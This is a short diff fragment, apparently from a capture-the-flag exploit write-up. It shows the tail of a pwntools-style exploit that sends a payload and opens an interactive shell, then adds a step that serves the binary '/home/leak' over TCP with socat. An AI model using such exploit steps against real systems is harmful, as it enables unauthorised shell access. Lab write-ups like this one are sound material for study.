@@ -39,3 +39,7 @@ shell.sendline(payload)
 shell.sendline(b"export HOME=/home/alex TERM=xterm; cd")
 shell.interactive()
 ```
+8) Expose the binary using socat and launch the exploit
+```bash
+socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &amp
+```
